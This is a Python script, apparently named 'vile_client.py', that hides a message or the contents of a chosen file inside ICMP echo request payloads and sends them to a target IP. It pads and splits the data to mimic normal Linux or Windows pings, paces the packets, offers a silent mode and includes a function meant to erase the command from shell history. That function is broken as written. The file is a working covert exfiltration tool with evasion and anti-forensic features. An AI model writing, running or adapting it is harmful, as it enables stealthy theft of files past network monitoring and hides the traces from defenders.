import socket
import struct
import os
import sys
import subprocess
import time


class Colors:
    """ANSI escape codes for colored terminal text."""
    RED = '\033[31m'
    GREEN = '\033[32m'
    RESET = '\033[0m'


def remove_last_command():
    """
    Remove the last command from the shell's history buffer.
    
    **Note:** This function is designed specifically for interactive shells using Bash.
    It deletes the last entry in the shell's history to avoid sensitive commands being 
    retained in history. Use with caution as it directly modifies the user's shell history.
    """
    try:
        subprocess.run(['history', '-d', str(os.getpid())], check=True, shell=True)
    except Exception as e:
        print(f"Warning: Could not remove last command from history. {e}")


def checksum(data):
    """
    Compute the checksum for the given data.
    
    This is used to calculate the checksum for ICMP packets. The checksum ensures
    the integrity of the packet and detects data corruption.
    
    Args:
        data (bytes): The data to compute the checksum for.
        
    Returns:
        int: The computed checksum value.
    """
    if len(data) % 2 != 0:
        data += b'\x00'  # Pad with a zero byte if the length is odd

    s = 0
    for i in range(0, len(data), 2):
        w = data[i] + (data[i+1] << 8)  # Combine two consecutive bytes into a 16-bit word
        s += w
        s = (s & 0xffff) + (s >> 16)  # Fold overflow into the least significant 16 bits
    return ~s & 0xffff


def print_help():
    """
    Display usage instructions for the script.
    
    Explains the available command-line arguments and their purposes to the user.
    """
    help_message = """
    Usage: python vile_client.py [options]

    Options:
    -t <IP>     Target IP address (default: 127.0.0.1)
    -m <msg>    Send a custom message as payload
    -f <file>   Send the contents of a text file as payload
    -s          Silent mode (suppress console output)
    -nr         No response mode (do not wait for server's response)
    -pl         Pad payload to 56 bytes (Linux style) and split if necessary
    -pw         Pad payload to 32 bytes (Windows style) and split if necessary
    -h          Show this help message and exit
    """
    print(help_message)


def send_packet(client_socket, target_addr, payload, packet_id, sequence, silent_mode):
    """
    Constructs and sends a single ICMP packet.
    
    Args:
        client_socket: The raw socket to send the packet on.
        target_addr: The target IP address.
        payload: The payload to include in the packet.
        packet_id: Identifier for the ICMP packet.
        sequence: Sequence number for the ICMP packet.
        silent_mode: If True, suppresses console output.
    """
    icmp_type = 8  # ICMP echo request
    code = 0

    # Build ICMP packet
    header = struct.pack('bbHHh', icmp_type, code, 0, packet_id, sequence)
    checksum_val = checksum(header + payload)
    header = struct.pack('bbHHh', icmp_type, code, socket.htons(checksum_val), packet_id, sequence)
    packet = header + payload

    # Send the packet
    client_socket.sendto(packet, (target_addr, 1))

    if not silent_mode:
        print(f"Sent packet to {Colors.RED}{target_addr}{Colors.RESET} with payload: {Colors.GREEN}{payload.decode(errors='ignore')}{Colors.RESET}")


def main():
    """
    Main function to handle client functionality.
    
    Parses command-line arguments, builds ICMP echo request packets,
    and sends them to the server. Can operate in various modes based on
    the arguments provided.
    """
    # Default values
    default_target = "127.0.0.1"  # Hardcoded fallback target
    target_addr = default_target
    icmp_payload = b''  # Default payload (empty)
    silent_mode = False
    no_response = False
    pad_like_windows = False
    pad_like_linux = False

    # Parse command-line arguments
    args = sys.argv[1:]
    if "-h" in args:
        print_help()
        sys.exit(0)

    if "-t" in args:
        try:
            target_addr = args[args.index("-t") + 1]
        except IndexError:
            print("Error: Target IP address is missing after -t.")
            sys.exit(1)

    if "-m" in args:
        try:
            message_index = args.index("-m") + 1
            if message_index < len(args):
                icmp_payload = args[message_index].encode()
            else:
                print("Error: Message is missing after -m.")
                sys.exit(1)
        except IndexError:
            print("Error: Message is missing after -m.")
            sys.exit(1)

    if "-f" in args:
        try:
            file_index = args.index("-f") + 1
            if file_index < len(args):
                with open(args[file_index], 'r') as file:
                    icmp_payload = file.read().encode()
            else:
                print("Error: File path is missing after -f.")
                sys.exit(1)
        except FileNotFoundError:
            print(f"Error: File {Colors.GREEN}'{args[file_index]}'{Colors.RESET} not found.")
            sys.exit(1)
        except IndexError:
            print("Error: File path is missing after -f.")
            sys.exit(1)

    if "-s" in args:
        silent_mode = True

    if "-nr" in args:
        no_response = True


    if "-pw" in args:
        pad_like_windows = True
        pad_like_linux = False

    if "-pl" in args:
        pad_like_linux = True
        pad_like_windows = False

    # Create a raw socket
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)

    packet_id = os.getpid() & 0xFFFF  # Use the process ID for the packet ID
    sequence = 1  # Initial sequence number

    # Handle windows-like or linux-like padding
    if pad_like_windows or pad_like_linux:
        payload_size = 32 if pad_like_windows else 56
        message_chunks = [
            icmp_payload[i:i+payload_size] for i in range(0, len(icmp_payload), payload_size)
        ]
        for chunk in message_chunks:
            if len(chunk) < payload_size:
                chunk = chunk.ljust(payload_size, b' ') #pad to 32
            send_packet(client_socket, target_addr, chunk, packet_id, sequence, silent_mode)
            sequence += 1
            time.sleep(2)  # Wait before sending the next packet
    else:
        # Send the single packet
        send_packet(client_socket, target_addr, icmp_payload, packet_id, sequence, silent_mode)

    if not no_response:
        # Receive ICMP response
        response, addr = client_socket.recvfrom(1024)

        if not silent_mode:
            print(f"Received response from {Colors.RED}{addr}{Colors.RESET}")


if __name__ == "__main__":
    main()
